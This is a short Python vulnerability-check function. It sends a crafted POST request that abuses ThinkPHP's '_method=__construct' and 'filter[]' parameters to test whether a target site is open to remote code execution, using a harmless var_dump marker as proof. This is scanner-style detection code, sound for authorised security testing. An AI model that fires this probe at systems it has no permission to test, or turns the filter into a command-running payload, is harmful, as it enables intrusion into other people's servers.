import urllib
import requests


def thinkphp_index_construct_rce(url):
    relsult = {
        'name': 'thinkphp_index_construct_rce',
        'vulnerable': False
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump'
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/index/index')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = vurl
            relsult['position'] = 'data'
            relsult['payload'] = payload
        return relsult
    except:
        return relsult

